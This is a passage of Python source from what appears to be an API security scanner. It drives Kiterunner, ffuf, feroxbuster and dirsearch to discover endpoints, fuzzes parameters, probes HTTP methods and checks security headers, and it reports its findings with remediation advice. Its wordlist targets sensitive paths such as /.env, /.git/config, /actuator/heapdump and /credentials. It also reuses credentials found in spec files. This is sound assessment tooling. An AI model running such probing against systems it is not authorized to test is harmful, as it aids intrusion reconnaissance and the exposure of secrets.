    "/auth", "/auth/login", "/auth/token", "/auth/refresh", "/auth/logout",
    "/oauth", "/oauth/token", "/oauth2/token", "/oauth2/authorize",
    "/login", "/logout", "/signin", "/signout", "/register",
    "/api/auth", "/api/login", "/api/token", "/api/logout",
    "/api/v1/auth", "/api/v1/login", "/api/v1/token",
    # Documentation / specs
    "/swagger", "/swagger-ui", "/swagger-ui.html", "/swagger.json", "/swagger.yaml",
    "/openapi.json", "/openapi.yaml", "/api-docs", "/api-docs.json",
    "/docs", "/redoc", "/graphql", "/graphiql", "/playground",
    # Health / monitoring
    "/health", "/healthz", "/health/live", "/health/ready", "/health/ping",
    "/status", "/ping", "/ready", "/live",
    "/api/health", "/api/status", "/api/ping",
    "/metrics", "/prometheus", "/stats",
    # Spring Boot Actuator
    "/actuator", "/actuator/health", "/actuator/env", "/actuator/metrics",
    "/actuator/mappings", "/actuator/beans", "/actuator/info",
    "/actuator/loggers", "/actuator/heapdump", "/actuator/threaddump",
    "/actuator/shutdown",
    # Admin / internal
    "/admin", "/admin/api", "/management", "/internal",
    "/api/admin", "/api/internal", "/api/debug", "/debug", "/console",
    # Sensitive files
    "/.env", "/.env.local", "/.env.production", "/.git/config",
    "/config", "/config.json", "/config.yaml", "/settings.json",
    "/secrets", "/credentials",
    # GraphQL
    "/api/graphql", "/query", "/gql",
    # Webhooks
    "/webhook", "/webhooks", "/callback", "/callbacks", "/hooks",
    # Files / uploads
    "/upload", "/uploads", "/files", "/file", "/media", "/attachments",
    # Common REST patterns
    "/api/v1/products", "/api/v1/orders", "/api/v1/payments",
    "/api/v1/roles", "/api/v1/permissions", "/api/v1/groups",
    "/api/v1/reports", "/api/v1/logs", "/api/v1/events",
    "/api/v1/notifications", "/api/v1/messages", "/api/v1/search",
]

# Common system wordlist paths to try before falling back to embedded list
_WORDLIST_SEARCH_PATHS = [
    "/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt",
    "/opt/SecLists/Discovery/Web-Content/api/api-endpoints.txt",
    "/usr/share/seclists/Discovery/Web-Content/common.txt",
    "/opt/SecLists/Discovery/Web-Content/common.txt",
    "/usr/share/wordlists/dirb/common.txt",
    "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
    "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt",
]


def _find_wordlist() -> str | None:
    """Return the path to the best available API wordlist, or None to use embedded list."""
    for p in _WORDLIST_SEARCH_PATHS:
        if os.path.isfile(p):
            return p
    return None


def _make_temp_wordlist() -> str:
    """Write the embedded API path list to a temp file and return its path."""
    fd, path = tempfile.mkstemp(suffix=".txt", prefix="siphon_wl_")
    with os.fdopen(fd, "w") as f:
        f.write("\n".join(_SIPHON_API_PATHS))
    return path


# ---------------------------------------------------------------------------
# External tool runners
# ---------------------------------------------------------------------------

def _run_kiterunner(base_url: str, target: dict, scan: dict,
                    output: OutputManager) -> list:
    """Run Kiterunner API route discovery. Returns list of (method, path, status) tuples."""
    kr_bin = shutil.which("kr")
    if not kr_bin:
        for p in ["/usr/local/bin/kr", "/opt/kiterunner/dist/kr"]:
            if os.path.isfile(p):
                kr_bin = p
                break
    if not kr_bin:
        con.info("Kiterunner (kr) not found — skipping. Install: https://github.com/assetnote/kiterunner")
        return []

    con.info("Kiterunner: scanning API routes …")
    wordlist = _find_wordlist()
    _tmp_wl  = None
    if not wordlist:
        _tmp_wl  = _make_temp_wordlist()
        wordlist = _tmp_wl

    out_file = output.tool_path("kiterunner", f"kiterunner_{target['host']}.txt")
    threads  = min(scan.get("tool_threads", _SCAN_SEM.limit), _SCAN_SEM.limit, 10)  # kr recommends ≤ 10

    cmd = [
        kr_bin, "scan", base_url,
        "-w", wordlist,
        "-x", str(threads),
        "-d", "1",
        "--output-file", str(out_file),
        "--fail-status-codes", "400,404,405,501",
        "--ignore-length", "0",
    ]
    if scan.get("proxy"):
        cmd += ["--proxy", scan["proxy"]]

    results: list = []
    try:
        proc = subprocess.run(
            cmd, capture_output=True, text=True,
            timeout=scan.get("max_tool_time", 120),
        )
        raw = proc.stdout + ("\n" + out_file.read_text(encoding="utf-8")
                             if out_file.exists() else "")
        # Parse: METHOD  STATUS [bytes,lines,words] URL
        _kr_re = re.compile(
            r'(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS)\s+(\d{3})\s+\[.*?\]\s+(https?://\S+)'
        )
        for m in _kr_re.finditer(raw):
            method, status, url = m.group(1), int(m.group(2)), m.group(3)
            path = urlparse(url).path or "/"
            if status not in (404, 400, 405, 501):
                results.append((method, path, status))
                output.add_finding(
                    phase="discovery",
                    title="API Endpoint Discovered (Kiterunner)",
                    severity="INFO",
                    url=url,
                    detail=(f"Kiterunner discovered {method} {path} — "
                            f"HTTP {status}"),
                    evidence=f"{method} {path} → {status}",
                    output_file=str(out_file),
                    extra={"owasp": "API9"},
                    source="kiterunner",
                )
        con.info(f"Kiterunner: {len(results)} route(s) found")
    except subprocess.TimeoutExpired:
        con.info("Kiterunner: scan timed out")
    except Exception as exc:
        con.info(f"Kiterunner: error — {exc}")
    finally:
        if _tmp_wl:
            try:
                os.unlink(_tmp_wl)
            except Exception:
                pass
    return results


def _run_ffuf_discovery(base_url: str, target: dict, scan: dict,
                        output: OutputManager) -> list:
    """Run FFUF endpoint discovery. Returns list of (method, path, status) tuples."""
    ffuf_bin = shutil.which("ffuf")
    if not ffuf_bin:
        for p in ["/usr/local/bin/ffuf", "/go/bin/ffuf"]:
            if os.path.isfile(p):
                ffuf_bin = p
                break
    if not ffuf_bin:
        con.info("ffuf not found — skipping. Install: brew install ffuf")
        return []

    con.info("FFUF: endpoint discovery …")
    wordlist = _find_wordlist()
    _tmp_wl  = None
    if not wordlist:
        _tmp_wl  = _make_temp_wordlist()
        wordlist = _tmp_wl

    out_file = output.tool_path("ffuf", f"ffuf_{target['host']}.json")
    threads  = min(scan.get("tool_threads", _SCAN_SEM.limit), _SCAN_SEM.limit)
    rate     = scan.get("tool_rate", 50)
    timeout  = scan.get("timeout", 10)

    # Build auth headers for ffuf
    hdrs = []
    for k, v in (scan.get("extra_headers") or {}).items():
        hdrs += ["-H", f"{k}: {v}"]
    auth_cfg = scan.get("auth", {})
    if auth_cfg.get("enabled") and auth_cfg.get("auth_token"):
        token_type = auth_cfg.get("token_type", "Bearer")
        hdrs += ["-H", f"Authorization: {token_type} {auth_cfg['auth_token']}"]

    cmd = [
        ffuf_bin,
        "-u", base_url.rstrip("/") + "/FUZZ",
        "-w", wordlist,
        "-mc", "200,201,202,204,301,302,307,401,403,405",
        "-t", str(threads),
        "-rate", str(rate),
        "-timeout", str(timeout),
        "-o", str(out_file),
        "-of", "json",
        "-s",  # silent (suppress progress)
    ] + hdrs
    if scan.get("proxy"):
        cmd += ["-x", scan["proxy"]]

    results: list = []
    try:
        subprocess.run(
            cmd, capture_output=True,
            timeout=scan.get("max_tool_time", 120),
        )
        if out_file.exists():
            data = json.loads(out_file.read_text(encoding="utf-8"))
            for r in data.get("results", []):
                status = r.get("status", 0)
                url    = r.get("url", "")
                path   = urlparse(url).path or "/"
                if status not in (404, 400):
                    results.append(("GET", path, status))
                    output.add_finding(
                        phase="discovery",
                        title="API Endpoint Discovered (FFUF)",
                        severity="INFO",
                        url=url,
                        detail=(f"FFUF discovered {path} — "
                                f"HTTP {status} ({r.get('length', 0)} bytes)"),
                        evidence=(f"GET {path} → {status} "
                                  f"({r.get('words', 0)} words, "
                                  f"{r.get('lines', 0)} lines)"),
                        output_file=str(out_file),
                        extra={"owasp": "API9"},
                        source="ffuf",
                    )
        con.info(f"FFUF: {len(results)} path(s) found")
    except subprocess.TimeoutExpired:
        con.info("FFUF: scan timed out")
    except Exception as exc:
        con.info(f"FFUF: error — {exc}")
    finally:
        if _tmp_wl:
            try:
                os.unlink(_tmp_wl)
            except Exception:
                pass
    return results


def _run_feroxbuster(base_url: str, target: dict, scan: dict,
                     output: OutputManager) -> list:
    """Run Feroxbuster recursive discovery. Returns list of (method, path, status) tuples."""
    fb_bin = shutil.which("feroxbuster")
    if not fb_bin:
        for p in ["/usr/local/bin/feroxbuster", "/usr/bin/feroxbuster"]:
            if os.path.isfile(p):
                fb_bin = p
                break
    if not fb_bin:
        con.info("feroxbuster not found — skipping. Install: brew install feroxbuster")
        return []

    con.info("Feroxbuster: recursive discovery …")
    wordlist = _find_wordlist()
    _tmp_wl  = None
    if not wordlist:
        _tmp_wl  = _make_temp_wordlist()
        wordlist = _tmp_wl

    out_file = output.tool_path("feroxbuster", f"feroxbuster_{target['host']}.txt")
    threads  = min(scan.get("tool_threads", _SCAN_SEM.limit), _SCAN_SEM.limit)
    rate     = scan.get("tool_rate", 50)
    timeout  = scan.get("timeout", 10)

    cmd = [
        fb_bin,
        "-u", base_url,
        "-w", wordlist,
        "-x", "json,yaml,xml,txt,env,conf",
        "-t", str(threads),
        "--rate-limit", str(rate),
        "--timeout", str(timeout),
        "--status-codes", "200,201,202,204,301,302,307,401,403,405",
        "--output", str(out_file),
        "--no-recursion",  # avoid runaway recursion on APIs
        "--silent",
        "--auto-tune",
    ]
    if not scan.get("verify_ssl", False):
        cmd.append("-k")
    if scan.get("proxy"):
        cmd += ["--proxy", scan["proxy"]]
    # Pass auth header if configured
    auth_cfg = scan.get("auth", {})
    if auth_cfg.get("enabled") and auth_cfg.get("auth_token"):
        token_type = auth_cfg.get("token_type", "Bearer")
        cmd += ["-H", f"Authorization: {token_type} {auth_cfg['auth_token']}"]

    results: list = []
    try:
        subprocess.run(
            cmd, capture_output=True,
            timeout=scan.get("max_tool_time", 120),
        )
        if out_file.exists():
            # Feroxbuster text output: "STATUS  METHOD  LINES WORDS CHARS URL"
            _fb_re = re.compile(
                r'(\d{3})\s+\w+\s+\d+l\s+\d+w\s+\d+c\s+(https?://\S+)'
            )
            raw = out_file.read_text(encoding="utf-8")
            for m in _fb_re.finditer(raw):
                status = int(m.group(1))
                url    = m.group(2)
                path   = urlparse(url).path or "/"
                results.append(("GET", path, status))
                output.add_finding(
                    phase="discovery",
                    title="API Endpoint Discovered (Feroxbuster)",
                    severity="INFO",
                    url=url,
                    detail=f"Feroxbuster discovered {path} — HTTP {status}",
                    evidence=f"GET {path} → {status}",
                    output_file=str(out_file),
                    extra={"owasp": "API9"},
                    source="feroxbuster",
                )
        con.info(f"Feroxbuster: {len(results)} path(s) found")
    except subprocess.TimeoutExpired:
        con.info("Feroxbuster: scan timed out")
    except Exception as exc:
        con.info(f"Feroxbuster: error — {exc}")
    finally:
        if _tmp_wl:
            try:
                os.unlink(_tmp_wl)
            except Exception:
                pass
    return results


def _run_dirsearch(base_url: str, target: dict, scan: dict,
                   output: OutputManager) -> list:
    """Run dirsearch path discovery. Returns list of (method, path, status) tuples."""
    # Try installed binary first, then common git-clone paths
    ds_bin = shutil.which("dirsearch")
    if not ds_bin:
        for p in ["/opt/dirsearch/dirsearch.py", "/usr/local/bin/dirsearch"]:
            if os.path.isfile(p):
                ds_bin = p
                break
    if not ds_bin:
        con.info("dirsearch not found — skipping. Install: git clone https://github.com/maurosoria/dirsearch /opt/dirsearch")
        return []

    con.info("dirsearch: path scanning …")
    out_file = output.tool_path("dirsearch", f"dirsearch_{target['host']}.json")
    threads  = min(scan.get("tool_threads", _SCAN_SEM.limit), _SCAN_SEM.limit)
    rate     = scan.get("tool_rate", 50)
    timeout  = scan.get("timeout", 10)

    # dirsearch.py requires python3 prefix when invoked as script
    cmd_prefix = [sys.executable] if ds_bin.endswith(".py") else []

    cmd = cmd_prefix + [
        ds_bin,
        "-u", base_url,
        "-e", "json,yaml,xml,conf,env,txt,ini,bak,config",
        "-t", str(threads),
        "--max-rate", str(rate),
        "--timeout", str(timeout),
        "-o", str(out_file),
        "--format", "json",
        "-q",  # quiet
        "-x", "400,404,500-599",
    ]
    if not scan.get("verify_ssl", False):
        cmd.append("--no-tls-errors")
    if scan.get("proxy"):
        cmd += ["--proxy", scan["proxy"]]

    results: list = []
    try:
        subprocess.run(
            cmd, capture_output=True,
            timeout=scan.get("max_tool_time", 120),
        )
        if out_file.exists():
            try:
                data = json.loads(out_file.read_text(encoding="utf-8"))
                items = data if isinstance(data, list) else data.get("results", [])
                for r in items:
                    status = r.get("status", 0)
                    url    = r.get("url", "")
                    if not url:
                        continue
                    path = urlparse(url).path or "/"
                    results.append(("GET", path, status))
                    output.add_finding(
                        phase="discovery",
                        title="API Endpoint Discovered (dirsearch)",
                        severity="INFO",
                        url=url,
                        detail=f"dirsearch discovered {path} — HTTP {status}",
                        evidence=(f"GET {path} → {status} "
                                  f"({r.get('content-length', r.get('length', 0))} bytes)"),
                        output_file=str(out_file),
                        extra={"owasp": "API9"},
                        source="dirsearch",
                    )
            except Exception:
                pass
        con.info(f"dirsearch: {len(results)} path(s) found")
    except subprocess.TimeoutExpired:
        con.info("dirsearch: scan timed out")
    except Exception as exc:
        con.info(f"dirsearch: error — {exc}")
    return results


def _run_ffuf_params(endpoint_url: str, phase: str, scan: dict,
                     output: OutputManager, sess: requests.Session) -> None:
    """Run FFUF to fuzz query parameters and POST fields on a single endpoint."""
    ffuf_bin = shutil.which("ffuf")
    if not ffuf_bin:
        return

    timeout = scan.get("timeout", 10)
    rate    = scan.get("tool_rate", 50)
    out_file = output.output_path(phase, f"ffuf_params_{re.sub(r'[^\\w]', '_', endpoint_url)[:60]}.json")

    # Common API parameter wordlist (minimal inline)
    _param_words = [
        "id", "user_id", "account_id", "admin", "debug", "format", "callback",
        "token", "key", "api_key", "page", "limit", "sort", "filter", "search",
        "q", "query", "data", "field", "fields", "include", "exclude", "expand",
        "type", "status", "role", "action", "cmd", "command", "file", "path",
        "url", "redirect", "next", "return", "from", "to", "start", "end",
        "username", "password", "email", "name", "value", "param", "input",
        "output", "mode", "version", "lang", "locale", "timezone",
    ]
    _tmp_wl = None
    try:
        fd, _tmp_wl = tempfile.mkstemp(suffix=".txt", prefix="siphon_pw_")
        with os.fdopen(fd, "w") as f:
            f.write("\n".join(_param_words))

        cmd = [
            ffuf_bin,
            "-u", endpoint_url + "?FUZZ=siphon_test",
            "-w", _tmp_wl,
            "-mc", "200,201,202,204,500",
            "-rate", str(rate),
            "-timeout", str(timeout),
            "-o", str(out_file),
            "-of", "json",
            "-s",
        ]
        # Build auth headers
        hdrs = []
        auth_cfg = scan.get("auth", {})
        if auth_cfg.get("enabled") and auth_cfg.get("auth_token"):
            token_type = auth_cfg.get("token_type", "Bearer")
            hdrs += ["-H", f"Authorization: {token_type} {auth_cfg['auth_token']}"]
        cmd += hdrs

        subprocess.run(cmd, capture_output=True, timeout=30)

        if out_file.exists():
            data = json.loads(out_file.read_text(encoding="utf-8"))
            for r in data.get("results", []):
                param = (r.get("input") or {}).get("FUZZ", "?")
                status = r.get("status", 0)
                fuzz_url = r.get("url", endpoint_url)
                output.add_finding(
                    phase=phase,
                    title="Undocumented API Parameter Accepted",
                    severity="LOW",
                    url=fuzz_url,
                    detail=(f"Parameter '{param}' accepted at {endpoint_url} — "
                            f"HTTP {status}"),
                    evidence=f"GET {endpoint_url}?{param}=siphon_test → {status}",
                    output_file=str(out_file),
                    extra={"owasp": "API3"},
                    source="ffuf",
                )
    except Exception:
        pass
    finally:
        if _tmp_wl:
            try:
                os.unlink(_tmp_wl)
            except Exception:
                pass


def phase_discovery(settings: dict, sess: requests.Session,
                    output: OutputManager) -> list:
    """Phase 0: Discover API endpoints via spec file(s) or active probing.

    Supports OpenAPI 2.x/3.x, Swagger, GraphQL SDL/introspection, Postman
    Collections, Insomnia exports, and HAR files.  Credentials embedded in
    spec files are extracted and applied to the session when no auth is already
    configured.  After building the inventory, active probing detects endpoints
    not listed in the spec (MEDIUM finding per undocumented path).
    """
    scan = settings["scan"]
    base_url = scan["api_base_url"]
    timeout = scan.get("timeout", 10)
    target = _parse_target(base_url)
    target_root = f"{target['scheme']}://{target['netloc']}"
    inventory: list = []
    spec_was_provided = False
    _spec_path_set: set = set()   # paths that came from a spec file

    con.status("discovery", "running", "Loading API specifications")

    # ------------------------------------------------------------------ #
    # 1. Load provided spec files (local paths or URLs)                   #
    # ------------------------------------------------------------------ #
    spec_sources: list[str] = []
    # Legacy single openapi_url field
    if scan.get("openapi_url"):
        spec_sources.append(scan["openapi_url"])
    # New multi-file list
    for src in scan.get("api_spec_files", []):
        if src and src not in spec_sources:
            spec_sources.append(src)

    all_creds: dict = {}
    for src in spec_sources:
        con.info(f"Loading spec: {src}")
        ep_list, creds, fmt = _load_spec_file(src, sess, timeout)
        if ep_list:
            spec_was_provided = True
            # Record finding for remotely accessible specs
            if src.startswith(("http://", "https://")):
                output.add_finding(
                    phase="discovery",
                    title="API Specification Exposed",
                    severity="INFO",
                    url=src,
                    detail=f"API specification ({fmt}) is publicly accessible.",
                    evidence=f"URL: {src}",
                    remediation="Restrict specification access to authorized users in production.",
                )
            con.info(f"  Loaded {len(ep_list)} endpoints ({fmt}) from {src}")
            for _ep in ep_list:
                _spec_path_set.add((_ep.get("path", "/")).rstrip("/") or "/")
            inventory.extend(ep_list)
        if creds:
            all_creds.update(creds)
            con.info(f"  Extracted credentials from spec ({fmt}): {list(creds.keys())}")

    # ------------------------------------------------------------------ #
    # 2. Apply spec credentials to session (only when no auth configured) #
    # ------------------------------------------------------------------ #
    auth_cfg = scan.get("auth", {})
    if all_creds and not auth_cfg.get("enabled"):
        applied: list[str] = []
        if all_creds.get("auth_token") and all_creds.get("auth_type") == "bearer":
            sess.headers["Authorization"] = f"Bearer {all_creds['auth_token']}"
            applied.append("Bearer token")
        elif all_creds.get("username") and all_creds.get("password"):
            import requests.auth as _req_auth
            sess.auth = _req_auth.HTTPBasicAuth(
                all_creds["username"], all_creds["password"]
            )
            applied.append("HTTP Basic")
        elif all_creds.get("api_key") and all_creds.get("api_key_header"):
            sess.headers[all_creds["api_key_header"]] = all_creds["api_key"]
            applied.append(f"API Key ({all_creds['api_key_header']})")
        if applied:
            con.info(f"Applied spec credentials to session: {', '.join(applied)}")

    # ------------------------------------------------------------------ #
    # 3. Auto-probe well-known paths if no spec loaded yet                #
    # ------------------------------------------------------------------ #
    if not spec_was_provided:
        for probe_path in _DISCOVERY_PATHS:
            probe_url = target_root + probe_path
            resp = _safe_get(sess, probe_url, timeout=timeout)
            if resp and resp.status_code == 200:
                content_type = resp.headers.get("Content-Type", "")
                if any(ct in content_type for ct in ("json", "yaml", "text")):
                    ep_list, _, fmt = _load_spec_file(probe_url, sess, timeout)
                    if ep_list:
                        spec_was_provided = True
                        con.info(f"Discovered spec at: {probe_url} ({fmt})")
                        output.add_finding(
                            phase="discovery",
                            title="API Specification Exposed",
                            severity="LOW",
                            url=probe_url,
                            detail=f"API specification ({fmt}) found at {probe_url}",
                            evidence=f"HTTP 200 with spec content",
                            remediation="Restrict specification access in production environments.",
                        )
                        inventory.extend(ep_list)
                        break

    # ------------------------------------------------------------------ #
    # 4. Fallback minimal inventory when nothing was found                #
    # ------------------------------------------------------------------ #
    if not inventory:
        con.info("No spec loaded; using minimal inventory from base URL")
        inventory = [{
            "method": "GET",
            "path": target["path"] or "/",
            "params": [],
            "body_fields": [],
            "auth_required": False,
            "operation_id": "root",
            "tags": [],
            "summary": "Base API endpoint",
        }]

    # Deduplicate inventory by (method, path)
    _seen_ep: set = set()
    deduped: list = []
    for ep in inventory:
        k = (ep.get("method", "GET"), ep.get("path", "/"))
        if k not in _seen_ep:
            _seen_ep.add(k)
            deduped.append(ep)
    inventory = deduped

    con.info(f"Inventory: {len(inventory)} unique endpoint(s)")

    # ------------------------------------------------------------------ #
    # 5. Probe for undocumented endpoints (only when a spec was provided) #
    # ------------------------------------------------------------------ #
    if spec_was_provided:
        _probe_undocumented_endpoints(settings, sess, output, inventory, target_root)

    # ------------------------------------------------------------------ #
    # 6. Wildcard / catch-all probe                                       #
    # ------------------------------------------------------------------ #
    con.info("Discovery: probing for wildcard/catch-all behaviour …")
    _wc_baseline = _detect_wildcard(target_root, sess, timeout)
    if _wc_baseline is not None:
        con.warn(
            f"[discovery] Wildcard detected (HTTP {_wc_baseline['status']}) — "
            "skipping FFUF/Feroxbuster/dirsearch"
        )

    # ------------------------------------------------------------------ #
    # 7. External tool discovery (Kiterunner, FFUF, Feroxbuster, dirsearch)
    # ------------------------------------------------------------------ #
    tools_cfg = scan.get("tools", {})
    _seen_paths = set((ep["method"], ep["path"]) for ep in inventory)

    _tool_discovered_paths: set = set()  # paths found exclusively by tools (not in spec)

    def _add_tool_paths(tool_results: list) -> None:
        for method, path, status in tool_results:
            if (method, path) not in _seen_paths and path:
                _seen_paths.add((method, path))
                inventory.append({
                    "method": method,
                    "path": path,
                    "params": [],
                    "body_fields": [],
                    "auth_required": status in (401, 403),
                    "operation_id": f"discovered_{method.lower()}_{path.strip('/').replace('/', '_')}",
                    "tags": ["discovered"],
                    "summary": f"Discovered via tool ({status})",
                })
                # Track paths not present in the spec for INFO findings
                path_norm = path.rstrip("/") or "/"
                if path_norm not in _spec_path_set and path not in _spec_path_set:
                    _tool_discovered_paths.add(path_norm)

    # Kiterunner: API-aware, not path-fuzzing — safe to run even on wildcard hosts
    if tools_cfg.get("kiterunner", True):
        _add_tool_paths(_run_kiterunner(target_root, target, scan, output))

    # FFUF, Feroxbuster, dirsearch: path-fuzzers — skip when wildcard detected
    if _wc_baseline is not None:
        con.info("Discovery: wildcard active — skipping FFUF/Feroxbuster/dirsearch")
    else:
        if tools_cfg.get("ffuf", True):
            _add_tool_paths(_run_ffuf_discovery(target_root, target, scan, output))

        if tools_cfg.get("feroxbuster", True):
            _add_tool_paths(_run_feroxbuster(target_root, target, scan, output))

        if tools_cfg.get("dirsearch", True):
            _add_tool_paths(_run_dirsearch(target_root, target, scan, output))

    # ------------------------------------------------------------------ #
    # 7b. Emit INFO findings for endpoints not in scope file              #
    # ------------------------------------------------------------------ #
    if spec_was_provided and _tool_discovered_paths:
        for dp in sorted(_tool_discovered_paths):
            output.add_finding(
                phase="discovery",
                title="Endpoint Not in Scope File",
                severity="INFO",
                url=target_root.rstrip("/") + dp,
                detail=(f"Endpoint '{dp}' was discovered during active probing but is "
                        f"not listed in the provided API specification/scope file."),
                evidence=f"Discovered via tool scan — not in spec",
                remediation=(
                    "Review whether this endpoint is intentional and update the API "
                    "specification if it should be in scope."
                ),
                extra={"owasp": "API9"},
            )

    # ------------------------------------------------------------------ #
    # 7c. HTTP method probing on tool-discovered paths                    #
    # ------------------------------------------------------------------ #
    _HTTP_PROBE_METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"]
    _method_probe_paths = {
        ep["path"] for ep in inventory if "discovered" in ep.get("tags", [])
    }
    if _method_probe_paths:
        con.status("discovery", "running",
                   f"HTTP method probing {len(_method_probe_paths)} discovered paths")
        threads = min(scan.get("threads", 10), _SCAN_SEM.limit)
        timeout_s = scan.get("timeout", 10)

        def _probe_methods(path: str) -> list:
            results = []
            url = target_root.rstrip("/") + path
            # OPTIONS first — may return Allow header listing all methods
            try:
                r = sess.options(url, timeout=timeout_s, allow_redirects=False,
                                 verify=False)
                allow_hdr = r.headers.get("Allow", "")
                if allow_hdr:
                    for m in allow_hdr.upper().split(","):
                        m = m.strip()
                        if m in _HTTP_PROBE_METHODS:
                            results.append((m, path, r.status_code))
            except Exception:
                pass
            if results:
                return results
            # Probe each method individually
            for method in _HTTP_PROBE_METHODS:
                try:
                    r = _safe_request(sess, method, url, timeout=timeout_s,
                                      allow_redirects=False)
                    if r and r.status_code not in (405, 501):
                        results.append((method, path, r.status_code))
                except Exception:
                    pass
            return results

        with ThreadPoolExecutor(max_workers=threads) as pool:
            futures = {pool.submit(_probe_methods, p): p for p in _method_probe_paths}
            for fut in as_completed(futures):
                path = futures[fut]
                try:
                    method_results = fut.result() or []
                except Exception:
                    method_results = []
                spec_methods_for_path: set = set()
                for ep in inventory:
                    if ep.get("path") == path and "discovered" not in ep.get("tags", []):
                        spec_methods_for_path.add(ep.get("method", "GET").upper())
                for method, p, status in method_results:
                    if (method, p) not in _seen_paths:
                        _seen_paths.add((method, p))
                        inventory.append({
                            "method": method,
                            "path": p,
                            "params": [],
                            "body_fields": [],
                            "auth_required": status in (401, 403),
                            "operation_id": f"probed_{method.lower()}_{p.strip('/').replace('/', '_')}",
                            "tags": ["discovered", "method_probed"],
                            "summary": f"Method probe ({status})",
                        })
                    # Emit INFO finding if this method was not in spec
                    if spec_was_provided and method not in spec_methods_for_path:
                        output.add_finding(
                            phase="discovery",
                            title="HTTP Method Not in Scope File",
                            severity="INFO",
                            url=target_root.rstrip("/") + p,
                            detail=(f"HTTP {method} on '{p}' returned {status} but "
                                    f"this method is not listed in the API specification."),
                            evidence=f"{method} {target_root.rstrip('/')}{p} → {status}",
                            remediation=(
                                "Verify whether this HTTP method is intentionally exposed. "
                                "Update the API spec if it is expected, or disable if not."
                            ),
                            extra={"owasp": "API9"},
                        )

    # ------------------------------------------------------------------ #
    # 8. Save inventory                                                   #
    # ------------------------------------------------------------------ #
    output.save_inventory(inventory)

    # Build initial API map from discovered inventory
    _api_map = build_api_map(
        inventory,
        spec_paths=_spec_path_set if spec_was_provided else None,
        auth_cfg=scan.get("auth"),
    )
    output.save_api_map(_api_map)
    # Stash map on output so later phases can update it
    output._api_map = _api_map
    output._spec_was_provided = spec_was_provided
    output._spec_path_set = _spec_path_set

    con.status("discovery", "done", f"{len(inventory)} endpoints in inventory")
    return inventory


# ---------------------------------------------------------------------------
# Phase 1: Recon — fingerprinting, headers, CORS
# ---------------------------------------------------------------------------

def phase_recon(settings: dict, sess: requests.Session,
                output: OutputManager) -> None:
    """Phase 1: API fingerprinting and security header analysis."""
    scan = settings["scan"]
    base_url = scan["api_base_url"]
    timeout = scan.get("timeout", 10)

    con.status("recon", "running", "Fingerprinting API server")

    resp = _safe_get(sess, base_url, timeout=timeout)
    if not resp:
        # Try HEAD
        resp = _safe_request(sess, "HEAD", base_url, timeout=timeout)
    if not resp:
        con.warn("Recon: could not reach API base URL")
        con.status("recon", "fail", "Unreachable")
        return

    # Write all response headers to an evidence file (shared by recon findings)
    _recon_host = urlparse(base_url).hostname or "target"
    _hdr_file = output.output_path("recon", f"response_headers_{_recon_host}.txt")
    _hdr_lines = [f"GET {base_url}", f"HTTP {resp.status_code}", ""]
    _hdr_lines += [f"{k}: {v}" for k, v in resp.headers.items()]
    _hdr_file.write_text("\n".join(_hdr_lines), encoding="utf-8")

    # Header Data Leakage — server/technology disclosure headers
    server = resp.headers.get("Server", "")
    x_powered = resp.headers.get("X-Powered-By", "")
    x_generator = resp.headers.get("X-Generator", "")
    _hdr_cmd = f"python3 -c \"import requests; r=requests.get('{base_url}'); print(dict(r.headers))\""
    if server:
        output.add_finding(
            phase="recon",
            title="Header Data Leakage: Server",
            severity="LOW",
            url=base_url,
            detail=f"Server header discloses web server software and potentially its version: '{server}'. Assists attackers in fingerprinting known vulnerabilities.",
            evidence=f"Server: {server}",
            remediation="Remove or genericize the Server header.",
            output_file=str(_hdr_file),
            extra={"command": _hdr_cmd},
        )
    if x_powered:
        output.add_finding(
            phase="recon",
            title="Header Data Leakage: X-Powered-By",
            severity="LOW",
            url=base_url,
            detail="The X-Powered-By response header discloses the application framework, language, or runtime version, reducing the attacker's effort needed to identify version-specific vulnerabilities.",
            evidence=f"X-Powered-By: {x_powered}",
            remediation='Remove or suppress the X-Powered-By header at the application framework or reverse-proxy level (e.g., app.disable("x-powered-by") in Express; Header unset X-Powered-By in Apache).',
            extra={"command": _hdr_cmd},
        )
    _aspnet = resp.headers.get("X-AspNet-Version", "") or resp.headers.get("X-AspNetMvc-Version", "")
    if _aspnet:
        output.add_finding(
            phase="recon",
            title="Header Data Leakage: X-AspNet-Version",
            severity="LOW",
            url=base_url,
            detail="The X-AspNet-Version response header reveals the exact ASP.NET framework version, aiding an attacker in identifying applicable CVEs or version-specific attack techniques.",
            evidence=f"X-AspNet-Version: {_aspnet}",
            remediation='Disable the header by setting enableVersionHeader="false" in the httpRuntime element of web.config.',
            extra={"command": _hdr_cmd},
        )
    _via = resp.headers.get("Via", "")
    if _via:
        output.add_finding(
            phase="recon",
            title="Header Data Leakage: Via",
            severity="LOW",
            url=base_url,
            detail=f"Via header discloses intermediate proxy or CDN infrastructure: '{_via}'. Reveals internal routing topology and proxy software versions.",
            evidence=f"Via: {_via}",
            remediation="Configure proxies and load balancers to strip or genericize the Via header.",
            extra={"command": _hdr_cmd},
        )

    # Security headers — restrict to the canonical 6
    _is_https = base_url.startswith("https://")
    hdrs = resp.headers
    if _is_https and not hdrs.get("Strict-Transport-Security"):
        output.add_finding(
            phase="recon",
            title="Missing Security Header: Strict-Transport-Security",
            severity="MEDIUM",
            url=base_url,
            detail="API does not set the Strict-Transport-Security header on HTTPS responses.",
            evidence="Strict-Transport-Security: (absent)",
            remediation="Add 'Strict-Transport-Security: max-age=31536000; includeSubDomains' to all HTTPS responses.",
            extra={"command": _hdr_cmd},
        )
    if not hdrs.get("Content-Security-Policy"):
        output.add_finding(
            phase="recon",
            title="Missing Security Header: Content-Security-Policy",
            severity="MEDIUM",
            url=base_url,
            detail="API does not set a Content-Security-Policy header.",
            evidence="Content-Security-Policy: (absent)",
            remediation="Define a Content-Security-Policy that restricts inline scripts and unsafe sources.",
            extra={"command": _hdr_cmd},
        )
    if not hdrs.get("X-Frame-Options"):
        output.add_finding(
            phase="recon",
            title="Missing Security Header: X-Frame-Options",
            severity="MEDIUM",
            url=base_url,
            detail="API does not set X-Frame-Options.",
            evidence="X-Frame-Options: (absent)",
            remediation="Add 'X-Frame-Options: DENY' or use CSP frame-ancestors 'none'.",
            extra={"command": _hdr_cmd},
        )
    if not hdrs.get("X-Content-Type-Options"):
        output.add_finding(
            phase="recon",
            title="Missing Security Header: X-Content-Type-Options",
            severity="LOW",
